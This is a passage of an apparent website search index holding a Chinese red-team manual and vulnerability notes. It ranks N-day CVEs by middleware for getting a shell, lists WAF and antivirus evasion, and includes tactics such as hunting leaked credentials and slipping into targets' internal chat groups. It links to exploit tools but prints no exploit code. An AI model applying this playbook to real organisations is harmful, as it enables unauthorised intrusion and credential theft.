A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP3 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.1 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/timwhitez/seeyon-OA-A8-GetShell \u8be6\u7ec6\u6587\u7ae0 https://www.jianshu.com/p/0955bdd7329c \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u8be6\u60c5 https://www.cnblogs.com/AtesetEnginner/p/12106741.html","title":"\u81f4\u8fdcOA\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#_1","text":"","title":"\u5386\u53f2\u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#cve-2020-0796","text":"\u6f0f\u6d1e\u7b80\u4ecb \u5fae\u8f6fSMBv3 Client/Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eCVE-2020-0796 \u5f71\u54cd\u8303\u56f4\uff1a Windows 10 Version 1903 for 32-bit SystemsWindows 10 Version 1903 for x64-based SystemsWindows 10 Version 1903 for ARM64- based SystemsWindows Server, Version 1903 (Server Core installation)Windows 10 Version 1909 for 32-bit SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for ARM64-based SystemsWindows Server, Version 1909 (Server Core installation) \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/chompie1337/SMBGhost_RCE_PoC \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Iamyoyodan/p/13081273.html \u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u5076\u5c14\u4f1a\u84dd\u5c4f \u9632\u62a4\u65b9\u6cd5 \u5173\u95ed\u9ad8\u5371\u7aef\u53e3139\u3001445\uff0c\u66f4\u65b0\u7cfb\u7edf\u5b89\u5168\u8865\u4e01\u7981\u7528SMBv3\u538b\u7f29\u547d\u4ee4: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\ Parameters\" DisableCompression -Type DWORD -Value 1 - Force","title":"CVE-2020-0796 \u6c38\u6052\u4e4b\u9ed1\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/","text":"HW\u5f39\u836f\u5e93\u4e4b\u7ea2\u961f\u4f5c\u6218\u624b\u518c \u672c\u6587\u6765\u81eaklionsec\u7684github \u8bf4\u660e \u4ee5\u4e0b\u4ec5\u9488\u5bf9\u65e5\u5e38 \"\u7ea2\u961f\"\u573a\u666f,\u8fdb\u884c\u4e86\u4e00\u6b21\u76f8\u5bf9\u5168\u9762\u5b8c\u6574\u7684\u5b9e\u6218\u653b\u51fb\u5229\u7528\u6280\u672f\u63d0\u70bc\u6c47\u603b\uff0c\u9488\u5bf9\u4e0d\u540c\u7684\u6e17\u900f\u9636\u6bb5,\u6240\u53ef\u80fd\u4f1a\u7528\u5230\u7684\u4e00\u4e9b\u6280\u672f\u90fd\u505a\u4e86\u8be6\u5c3d\u68b3\u7406\u8bf4\u660e(\u540e\u9762\u53ef\u80fd\u8fd8\u4f1a\u6574\u7406\u51fa\u5bf9\u5e94\u7684\u5b8c\u6574\u5de5\u5177\u94fe,\u867d\u7136\u90a3\u4e0d\u662f\u6700\u4e3b\u8981\u7684),\u7531\u4e8e\u7ea2\u961f\u4e0d\u540c\u4e8e\u4e00\u822c\u7684\u6e17\u900f\u6d4b\u8bd5,\u5f3a\u8c03\u66f4\u591a\u7684\u662f\u5982\u4f55\u641e\u8fdb\u53bb\u62ff\u5230\u76f8\u5e94\u673a\u5668\u6743\u9650\u6216\u8005\u5b9e\u73b0\u67d0\u7279\u5b9a\u76ee\u7684\u800c\u4e0d\u5c40\u9650\u4e8e\u4f60\u4e00\u5b9a\u8981\u5728\u4ec0\u4e48\u65f6\u95f4,\u7528\u4ec0\u4e48\u6280\u672f\u6216\u8005\u5fc5\u987b\u901a\u8fc7\u4ec0\u4e48\u9014\u5f84\u53bb\u641e,\u76f8\u6bd4\u4f20\u7edf\u6e17\u900f\u6d4b\u8bd5,\u7ea2\u961f\u5219\u66f4\u8d8b\u4e8e\u771f\u5b9e\u7684\u5165\u4fb5\u6d3b\u52a8\u8fd9\u79cd\u573a\u666f\u5176\u5b9e\u5bf9\u9632\u5fa1\u8005\u7684\u5b9e\u6218\u5bf9\u6297\u7ecf\u9a8c\u548c\u6280\u672f\u6df1\u5ea6\u90fd\u662f\u6bd4\u8f83\u5927\u7684\u6311\u6218,\u6240\u4ee5\u4ee5\u4e0b\u7684\u6240\u6709\u6280\u672f\u70b9\u4e5f\u51e0\u4e4e\u90fd\u662f\u5b8c\u5168\u7ad9\u5728\u8fd9\u79cd\u573a\u666f\u548c\u89d2\u5ea6\u4e0b\u6765\u8003\u91cf\u68b3\u7406\u7684\u9700\u8981\u7279\u522b\u8bf4\u660e\u7684\u662f, \u6240\u6709\u653b\u51fb\u624b\u6cd5\u5728\u73b0\u5b9e\u4e2d\u90fd\u7edd\u4e0d\u662f\u5b8c\u5168\u5b64\u7acb\u4f7f\u7528\u7684,\u5f80\u5f80\u5f88\u591a\u624b\u6cd5\u90fd\u662f\u76f8\u4e92\u7075\u6d3b\u7ec4\u5408\u8d77\u6765\u8fdb\u884c\u5faa\u73af\u5229\u7528,\u7531\u4e8e\u7edd\u5927\u90e8\u5206\u5185\u5bb9\u90fd\u662f\u57fa\u4e8e\u672c\u4eba\u5e73\u65f6\u5b66\u4e60\u5b9e\u6218\u79ef\u7d2f\u7684\u4e00\u4e9b\u7ecf\u9a8c,\u52a0\u4e4b\u6bcf\u4e2a\u4eba\u7684\u5b9e\u9645\u6e17\u900f\u601d\u8def\u90fd\u4e0d\u540c,\u6240\u4ee5\u80af\u5b9a\u4f1a\u6709\u9057\u6f0f\u7684\u5730\u65b9,\u4e5f\u6b22\u8fce\u5f1f\u5144\u4eec\u4e00\u8d77\u6765\u79ef\u6781\u6307\u6b63\u8865\u5145\u5b8c\u5584,\u4e2a\u4eba\u89c9\u5f97,\u6700\u597d\u7684\u9632\u5fa1\u6c38\u8fdc\u4e0d\u662f\u600e\u4e48\u53bb\u9632\u67d0\u4e2a\u5de5\u5177,\u662f\u4e2a\u660e\u767d\u4eba\u90fd\u77e5\u9053,\u56e0\u4e3a\u5de5\u5177\u8fd9\u4e9b\u4e1c\u897f\u672c\u8eab\u5c31\u662f\u6b7b\u7684,\u7a0d\u5fae\u6539\u4e0b,\u5b9a\u5236\u4e0b,\u73b0\u6709\u7684\u89c4\u5219\u53ef\u80fd\u9a6c\u4e0a\u5c31\u9632\u4e0d\u4f4f\u4e86,\u4e14\u4e00\u76f4\u4f1a\u5904\u4e8e\u75b2\u4e8e\u5e94\u4ed8\u7684\u88ab\u52a8\u9632\u5fa1\u72b6\u6001,\u5c24\u5176\u662f\u9488\u5bf9\u7ea2\u961f\u8fd9\u79cd\u7279\u6b8a\u573a\u666f\u7684,\u4f60\u7684\u5b9e\u9645\u5bf9\u624b\u5f88\u53ef\u80fd\u90fd\u662f\u6709\u4e00\u5b9a\u6280\u672f\u5b9e\u529b\u7684\u4eba,\u6240\u4ee5\u9488\u5bf9\u6bcf\u79cd\u6838\u5fc3\u7684\u653b\u51fb\u6280\u672f\u6280\u672f\u5c55\u5f00\u505a\u6df1\u5165\u5206\u6790, \u76f4\u63a5\u4ece\u6e90\u5934\u4e0a\u8fdb\u884c\u9632\u5fa1\u624d\u662f\u6700\u9760\u8c31\u7684,\u867d\u7136\u8bf4\u77ed\u671f\u8fd9\u79cd\u6210\u672c\u4ee3\u4ef7\u76f8\u5bf9\u8f83\u9ad8, \u4f46\u957f\u671f\u6765\u770b, \u662f\u4e00\u52b3\u6c38\u9038\u7684,\u6c89\u6dc0\u4e0b\u6765\u7684\u8fd9\u4e9b\u4e1c\u897f\u6700\u7ec8\u4e5f\u4f1a\u6162\u6162\u5f62\u6210\u81ea\u5df1\u4ea7\u54c1\u7684\u6838\u5fc3\u7ade\u4e89\u529b\u548c\u7279\u8272,\u8bf4\u767d\u70b9,\u8fd9\u79cd\u5bf9\u6297,\u672c\u8d28\u4e0a\u62fc\u7684\u8fd8\u662f\u53cc\u65b9\u7684\u6280\u672f\u5b9e\u529b,\u4e0d\u4ec5\u8981\u80fd\u5728\u4e0d\u77e5\u89c9\u7684\u60c5\u51b5\u4e0b\u641e\u8fdb\u53bb,\u800c\u4e14\u8981\u80fd\u65e0\u9650\u5236\u52a0\u5927\u5bf9\u65b9\u540e\u671f\u7684\u6eaf\u6e90\u6210\u672c\u53e6\u5916,\u4f5c\u4e3a\u4e00\u540d\u5408\u683c\u7684\u653b\u9632\u4eba\u5458,\u5de5\u5177\u7684\u719f\u7ec3\u638c\u63e1\u4ec5\u4ec5\u53ea\u662f\u6781\u5c0f\u7684\u4e00\u90e8\u5206,\u5bf9\u5404\u79cd\u5229\u7528\u539f\u7406\u7684\u6df1\u5ea6\u7406\u89e3\u548c\u4e8c\u6b21\u5b9a\u5236\u80fd\u529b\u624d\u662f\u4f60\u7684\u6838\u5fc3. \u65e5\u5e38\u6d41\u7a0b\u7b80\u8981\u8bf4\u660e \u5165\u53e3\u6743\u9650 => \u5185\u7f51\u641c\u96c6/\u63a2\u6d4b => \u514d\u6740\u63d0\u6743[\u975e\u5fc5\u987b] => \u6293\u53d6\u767b\u5f55\u51ed\u8bc1 => \u8de8\u5e73\u53f0\u6a2a\u5411 => \u5165\u53e3\u7ef4\u6301 => \u6570\u636e\u56de\u4f20 => \u5b9a\u671f\u6743\u9650\u7ef4\u62a4 0x01 \u5165\u53e3\u6743\u9650\u83b7\u53d6[\u524d\u671f\u4fa6\u5bdf\uff0c\u641c\u96c6\u9636\u6bb5\u672c\u8eab\u5c31\u4e0d\u5b58\u5728\u592a\u591a\u53ef\u9632\u5fa1\u7684\u70b9\uff0c\u975e\u9632\u5fa1\u91cd\u5fc3] \u00b6 \u7ed5CDN\u627e\u51fa\u76ee\u6807\u6240\u6709\u771f\u5b9eip\u6bb5 \u627e\u76ee\u6807\u7684\u5404\u79cdWeb\u7ba1\u7406\u540e\u53f0\u767b\u5f55\u53e3 \u6279\u91cf\u6293\u53d6\u76ee\u6807\u6240\u6709\u771f\u5b9eC\u6bb5 Web banner \u6279\u91cf\u5bf9\u76ee\u6807\u6240\u6709\u771f\u5b9eC\u6bb5\u8fdb\u884c\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u626b\u63cf\u63a2\u6d4b\u8bc6\u522b \u5c1d\u8bd5\u76ee\u6807DNS\u662f\u5426\u5141\u8bb8\u533a\u57df\u4f20\u9001,\u5982\u679c\u4e0d\u5141\u8bb8\u5219\u7ee7\u7eed\u5c1d\u8bd5\u5b50\u57df\u7206\u7834 \u6279\u91cf\u6293\u53d6\u76ee\u6807\u6240\u6709\u5b50\u57df Web banner \u6279\u91cf\u5bf9\u76ee\u6807\u6240\u6709\u5b50\u57df\u96c6\u4e2d\u8fdb\u884c\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u63a2\u6d4b\u8bc6\u522b \u6279\u91cf\u8bc6\u522b\u76ee\u6807 \u6240\u6709\u5b58\u6d3bWeb\u7ad9\u70b9\u7684Web\u7a0b\u5e8f\u6307\u7eb9 \u53ca\u5176\u8be6\u7ec6\u7248\u672c \u4ece Git \u4e2d\u67e5\u627e\u76ee\u6807\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6\u53ca\u8d26\u53f7\u5bc6\u7801,\u5076\u5c14\u751a\u81f3\u8fd8\u80fd\u78b0\u5230\u76ee\u6807\u4e0d\u5c0f\u5fc3\u6cc4\u9732\u7684\u5404\u79cd\u4e91\u7684 \"AccessKey\" \u4ece\u7f51\u76d8/\u767e\u5ea6\u6587\u5e93\u4e2d\u67e5\u627e\u76ee\u6807\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6\u53ca\u8d26\u53f7\u5bc6\u7801 \u4ece\u5404\u7b2c\u4e09\u65b9\u5386\u53f2\u6f0f\u6d1e\u5e93\u4e2d\u67e5\u627e\u76ee\u6807\u66fe\u7ecf\u6cc4\u9732\u7684\u5404\u79cd\u654f\u611f\u8d26\u53f7\u5bc6\u7801 [\u56fd\u5185\u76ee\u6807\u5f88\u597d\u4f7f] \u76ee\u6807Svn\u91cc\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6 \u7f51\u7ad9\u76ee\u5f55\u626b\u63cf [\u67e5\u627e\u76ee\u6807\u7f51\u7ad9\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6, \u7f51\u7ad9\u5907\u4efd\u6587\u4ef6,\u654f\u611f\u914d\u7f6e\u6587\u4ef6, \u6e90\u7801 , \u522b\u4eba\u7684webshell, \u7b49\u7b49\u7b49...] \u76ee\u6807\u7ad9\u70b9\u81ea\u8eab\u5728\u524d\u7aef\u4ee3\u7801\u4e2d\u6cc4\u9732\u7684\u5404\u79cd\u654f\u611f\u4fe1\u606f fofa / shodan / bing / google hacking \u6df1\u5ea6\u5229\u7528 \u641c\u96c6\u76ee\u6807\u5b66\u751f\u5b66\u53f7 / \u5458\u5de5\u5de5\u53f7 / \u76ee\u6807\u90ae\u7bb1 [\u5e76\u987a\u624b\u5230\u5404\u4e2a\u793e\u5de5\u5e93\u4e2d\u53bb\u6279\u91cf\u67e5\u8be2\u8fd9\u4e9b\u90ae\u7bb1\u66fe\u7ecf\u662f\u5426\u6cc4\u9732\u8fc7\u5bc6\u7801 ] \u76ee\u6807\u81ea\u5df1\u5bf9\u5916\u63d0\u4f9b\u7684\u5404\u79cd \u6280\u672f\u6587\u6863 / wiki\u91cc\u6cc4\u9732\u7684\u5404\u79cd\u8d26\u53f7\u5bc6\u7801\u53ca\u5176\u5b83\u654f\u611f\u4fe1\u606f \u76ee\u6807\u5fae\u4fe1\u5c0f\u7a0b\u5e8f \u5206\u6790\u76ee\u6807app Web\u8bf7\u6c42 \u501f\u52a9js\u63a2\u9488\u641c\u96c6\u76ee\u6807\u5185\u7f51\u4fe1\u606f \u60f3\u529e\u6cd5\u6df7\u5165\u76ee\u6807\u7684\u5404\u79cd \u5185\u90e8QQ\u7fa4 / \u5fae\u4fe1\u7fa4 \u5206\u6790\u76ee\u6807\u76f4\u63a5\u4f9b\u5e94\u5546 [\u5c24\u5176\u662f\u6280\u672f\u5916\u5305] \u6839\u636e\u524d\u9762\u5df2\u641c\u96c6\u5230\u7684\u5404\u7c7b\u4fe1\u606f\u5236\u4f5c\u6709\u9488\u5bf9\u6027\u7684\u5f31\u53e3\u4ee4\u5b57\u5178 \u76ee\u6807\u6240\u7528 Waf \u79cd\u7c7b\u8bc6\u522b \u4e0e \u7ed5\u8fc7 BypassWAF \u6587\u4ef6\u4e0a\u4f20 / \u8bfb\u53d6 / \u4e0b\u8f7d BypassWAF Sql\u6ce8\u5165 BypassWAF RCE BypassWAF \u5404\u7c7bJava Web\u4e2d\u95f4\u4ef6\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 BypassWAF Webshell \u514d\u6740 0x02 \u5165\u53e3\u6743\u9650\u83b7\u53d6[ \u5916\u90e8\u9632\u5fa1\u91cd\u5fc3 ( \"\u91cd\u4e2d\u4e4b\u91cd\" ) ] \u00b6 \u6b64\u9636\u6bb5,\u4e3b\u8981\u662f\u9488\u5bf9\u5404\u4e3b\u6d41 \"\u4e2d\u95f4\u4ef6 + \u5f00\u6e90\u7a0b\u5e8f + Web\u670d\u52a1\u7ec4\u4ef6\" \u81ea\u8eab\u7684\u5404\u79cd\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528\u5982\u4e0b\u5df2\u6309 \"\u5b9e\u9645\u653b\u51fb\u5229\u7528\u7684\u96be\u6613\u7a0b\u5ea6\" \u53ca \"\u83b7\u53d6\u5230\u7684shell\u6743\u9650\u9ad8\u4f4e\"\u4e3a\u6807\u51c6\u8fdb\u884c\u4e86\u8be6\u7ec6\u6392\u5e8f,\u7531\u4e8e\u5b8c\u5168\u4ee5\u5b9e\u6218\u5229\u7528\u4e3a\u5bfc\u5411,\u6545\u4ec5\u4ec5\u53ea\u6311\u9009\u4e86\u4e00\u4e9b\u76f8\u5bf9\u4f1a\u7ecf\u5e38\u9047\u5230\u7684,\u4e14\u5b9e\u6218\u4e2d\u786e\u5b9e\u80fd\u6709\u6548\u534f\u52a9\u5feb\u901fgetshell \u7684 \"\u4e2d\u95f4\u4ef6\" , \"\u5f00\u6e90\u7a0b\u5e8f\" \u53ca \"web\u7ec4\u4ef6\" \u9488\u5bf9\u5404\u7c7bJava\u4e2d\u95f4\u4ef6\u7684\u5404\u79cd\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 \u4e0d\u540c\u4e8e\u5176\u5b83\u811a\u672c\u7c7bweb\u7a0b\u5e8f,Java\u7684\u8fd0\u884c\u6743\u9650\u901a\u5e38\u90fd\u6bd4\u8f83\u9ad8,\u751a\u81f3\u5927\u90e8\u5206\u90fd\u662f\u76f4\u63a5\u7528root/administrator/system\u6743\u9650\u5728\u8dd1,\u6240\u4ee5\u62ff\u5230\u7684shell\u6743\u9650\u4e00\u822c\u4e5f\u975e\u5e38\u9ad8,\u901a\u5e38\u90fd\u76f4\u63a5\u662f\u670d\u52a1\u5668\u6743\u9650,\u5c24\u5176\u662f\u5728\u5404\u79cd\u7ea2\u961f\u573a\u666f\u4e2d,\u5165\u4fb5\u8005\u4e00\u822c\u4e5f\u90fd\u4f1a\u9996\u9009\u8fd9\u4e9b\u70b9,\u5e76\u4ee5\u6b64\u4e3a\u7a81\u7834\u53e3\u6765\u83b7\u53d6\u4e00\u4e2a\u7a33\u5b9a\u7684\u8df3\u677f\u673a\u5165\u53e3\u6743\u9650,\u5173\u4e8e\u5230\u5e95\u54ea\u4e9b\u884c\u4e1a\u7279\u522b\u7231\u7528\u54ea\u4e9b\u4e2d\u95f4\u4ef6,\u8fd9\u4e9b\u4e5f\u5e94\u8be5\u90fd\u662f\u6709\u4e8b\u5148\u5206\u6790\u68b3\u7406\u6c47\u603b\u597d\u7684 Struts2 Struts2-005 Struts2-008 Struts2-009 Struts2-013 Struts2-016(\u5b9e\u9645\u4e0a,\u5f88\u591a\u90fd\u8001\u7cfb\u7edf\u90fd\u6f0f\u8865\u4e86\u8fd9\u4e2a\u6d1e,\u6210\u529f\u7387\u8f83\u9ad8) Struts2-019 Struts2-020 Struts2-devmode Struts2-032 Struts2-033 Struts2-037 Struts2-045 Struts2-046 Struts2-048 Struts2-052 Struts2-053 Struts2-057 weblogic CVE-2019-2725 CVE-2019-2729 CVE-2018-3191 CVE-2018-2628 CVE-2018-2893 CVE-2018-2894 CVE-2017-3506 CVE-2017-10271 CVE-2017-3248 CVE-2016-0638 CVE-2016-3510 CVE-2015-4852 CVE-2014-4210 SSRF \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Jboss CVE-2015-7501 CVE-2017-7504 CVE-2017-12149 \u672a\u6388\u6743\u8bbf\u95ee,\u90e8\u7f72webshell \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell wildfly [ jboss 7.x \u6539\u540d\u4e3a wildfly ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Tomcat CVE-2016-8735 CVE-2017-12615 [ readonly \u5b9e\u9645\u8bbe\u4e3a true\u7684\u60c5\u51b5\u8f83\u5c11,\u7a0d\u9e21\u808b ] CVE-2020-1938 [ AJP\u534f\u8bae\u6f0f\u6d1e,\u76f4\u63a5\u628a8009\u7aef\u53e3\u66b4\u9732\u5728\u5916\u7f51\u7684\u4e0d\u592a\u591a,\u7a0d\u9e21\u808b ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshelll [ \u6ce8: 7.x\u7248\u672c\u540e,\u9ed8\u8ba4\u52a0\u4e86\u9632\u7206\u673a\u5236 ] Jekins CVE-2018-1999002 [\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6] \u672a\u6388\u6743\u8bbf\u95ee,\u4efb\u610f\u547d\u4ee4\u6267\u884c \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u4efb\u610f\u547d\u4ee4\u6267\u884c ElasticSearch CVE-2014-3120 [\u4e13\u95e8\u9488\u5bf9\u8001\u7248\u672c(\u65e0\u6c99\u76d2)RCE] CVE-2015-1427 [Groovy RCE] CVE-2015-3337 [\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6] \u672a\u6388\u6743\u8bbf\u95ee,\u654f\u611f\u4fe1\u606f\u6cc4\u9732 RabbitMQ \u5f31\u53e3\u4ee4 Glassfish \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 [ \u4f4e\u7248\u672c ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell IBM Websphere Java \u53cd\u5e8f\u5217\u5316 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Axis2 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u76ee\u5f55\u904d\u5386 Apache ActiveMQ \u672a\u6388\u6743\u8bbf\u95ee,5.12 \u4e4b\u524d\u7684\u7248\u672c fileserver\u5b58\u5728 PUT\u4efb\u610f\u5199 CVE-2015-5254 Apache Solr CVE-2017-12629 CVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ] Apache Zookeeper \u672a\u6388\u6743\u8bbf\u95ee,\u654f\u611f\u4fe1\u606f\u6cc4\u9732 Apache Shiro\u53cd\u5e8f\u5217\u5316 fastjson <= 1.2.47 \u53cd\u5e8f\u5217\u5316\u5229\u7528 \u9488\u5bf9\u5404\u7c7bWindows php\u96c6\u6210\u73af\u5883 [ \u7531\u4e8e\u6b64\u7c7b\u73af\u5883\u62ff\u5230\u7684Webshell\u6743\u9650\u76f8\u5bf9\u8f83\u9ad8,\u6240\u4ee5,\u901a\u5e38\u4e5f\u662f\u7ea2\u961f\u4eba\u5458\u7684\u9996\u9009\u7a81\u7834\u53e3 ] AppServ Xampp \u5b9d\u5854 PhpStudy ...... \u9488\u5bf9\u5404\u7c7b\u5f00\u6e90\u7a0b\u5e8f\u7684 \u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 Dedecms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 thinkphp 5.x \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 phpcms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 ecshop \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 Metinfo \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 discuz \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 \u5e1d\u56fdcms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 phpmyadmin \u6570\u636e\u5e93\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 wordpress \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 joomla \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 drupal CVE-2018-7600 ,\u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 ...... \u9488\u5bf9\u5176\u5b83\u5404\u7c7bWeb\u7ec4\u4ef6\u7684 \u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 IIS 6.0 RCE \u77ed\u6587\u4ef6\u6f0f\u6d1e PUT \u4efb\u610f\u5199 Webdav RCE CVE-2017-7269 \u7985\u9053\u9879\u76ee\u7ba1\u7406\u7cfb\u7edf SQL\u6ce8\u5165 \u6587\u4ef6\u8bfb\u53d6 \u8fdc\u7a0b\u6267\u884c \u901a\u8fbeOA SQL\u6ce8\u5165 \u4efb\u610f\u4e0a\u4f20 Exchange \u5229\u7528\u63a5\u53e3\u8fdb\u884c\u90ae\u7bb1\u7528\u6237\u540d\u679a\u4e3e \u9488\u5bf9\u5404\u4e2a\u63a5\u53e3\u7684\u5f31\u53e3\u4ee4\u7206\u7834 CVE-2020-0688 [ \u5229\u7528\u524d\u63d0\u662f\u9700\u8981\u5148\u5f97\u6709\u4efb\u610f\u4e00\u4e2a\u90ae\u7bb1\u7528\u6237\u6743\u9650 ] .... Zimbra [ XXE + SSRF => RCE ] CVE-2013-7091 CVE-2016-9924 CVE-2019-9670 Citrix CVE-2019-19781 Jumpserver \u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 Zabbix CVE-2017-2824 SQL\u6ce8\u5165 [ 2.0 \u8001\u7248\u672c ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u654f\u611f\u673a\u5668\u4fe1\u606f\u6cc4\u9732 Cacti \u4f4e\u7248\u672c SQL\u6ce8\u5165 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4 Nagios CVE-2016-9565 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4 Webmin RCE CVE-2019-15107 PHPMailer CVE-2016-10033 \u6cdb\u5faeOA\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u91d1\u8776OA SQL\u6ce8\u5165 Coremail \u654f\u611f\u6587\u4ef6\u6cc4\u9732 UEditor \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 OpenSSL\u5fc3\u810f\u6ef4\u8840\u6293\u660e\u6587\u8d26\u53f7\u5bc6\u7801 [ Heartbleed ] \u7834\u58f3\u6f0f\u6d1e [ Shellshock ] \u5404\u79cd\u80fd\u5feb\u901fgetshell\u7684\u5e38\u89c4\u57fa\u7840Web\u6f0f\u6d1e\u5229\u7528 [ \u6ce8: \u6709\u4e9b\u6f0f\u6d1e\u5728\u4e0d\u5ba1\u4ee3\u7801\u7684\u60c5\u51b5\u4e0b\u5176\u5b9e\u662f\u5f88\u96be\u6709\u6548\u76f2\u6d4b\u5230\u7684 ] \u540e\u53f0\u5f31\u53e3\u4ee4 SSRF sql\u6ce8\u5165 \u8d8a\u6743 \u547d\u4ee4 / \u4ee3\u7801\u6267\u884c / \u53cd\u5e8f\u5217\u5316 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 / \u4e0b\u8f7d / \u8bfb\u53d6 \u5305\u542b XSS\uff08\u5b9e\u9645\u4e0a,XSS\u53ea\u6709\u5728\u9488\u5bf9\u67d0\u4e9b\u7279\u5b9a\u90ae\u7bb1,\u624b\u91cc\u6709\u6d4f\u89c8\u56680day\u65f6\u4ef7\u503c\u624d\u4f1a\u6bd4\u8f83\u5927,\u7ea2\u961f\u573a\u666f\u4e0b\u5176\u5b9e\u5e76\u4e0d\u662f\u975e\u5e38\u81f4\u547d) \u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e \u9488\u5bf9\u5404\u7c7b\u8fb9\u754c\u7f51\u7edc\u8bbe\u5907\u7684\u5404\u79cd\u5229\u7528,\u4e3b\u8981\u662fWeb\u7ba1\u7406\u63a7\u5236\u53f0\u767b\u5f55\u5f31\u53e3\u4ee4\u53ca \u5404\u7c7b\u5df2\u77e5nday\u653b\u51fb\u5229\u7528 Pulse Secure VPN CVE-2019-11510 [ \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 ] Fortinet VPN CVE-2018-13379 [ \u6587\u4ef6\u8bfb\u53d6 ] Sangfor Vpn RCE 0x03 \u5165\u53e3\u6743\u9650\u83b7\u53d6[\u4e13\u95e8\u9488\u5bf9\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u7684\u5404\u79cdgetshell\u5229\u7528\uff0c\u9632\u5fa1\u91cd\u70b9 ( \"\u91cd\u4e2d\u4e4b\u91cd\" )] \u00b6 \u6b64\u5904\u4ec5\u4ec5\u53ea\u6311\u9009\u4e86\u4e00\u4e9b\u5b9e\u6218\u4e2d\u771f\u6b63\u80fd\u534f\u52a9\u5feb\u901fgetshell\u7684\u670d\u52a1,\u5176\u5b83\u7684\u4e00\u4e9b\u76f8\u5bf9\u8fb9\u7f18\u6027\u7684\u670d\u52a1\u5747\u672a\u63d0\u53ca,\u540c\u6837,\u5df2\u6309 \"\u5b9e\u9645\u653b\u51fb\u5229\u7528\u7684\u96be\u6613\u7a0b\u5ea6\" \u53ca \"\u83b7\u53d6\u5230\u7684shell\u6743\u9650\u9ad8\u4f4e\"\u4e3a\u6807\u51c6\u8fdb\u884c\u4e86\u8be6\u7ec6\u6392\u5e8f\u5982\u4e0b,\u5c31\u6bcf\u4e2a\u7aef\u53e3\u7684\u5177\u4f53\u653b\u51fb\u5229\u7528\u65b9\u5f0f,\u8fdb\u884c\u4e86\u7b80\u8981\u8bf4\u660e Top Port List Mssql [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1433\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, 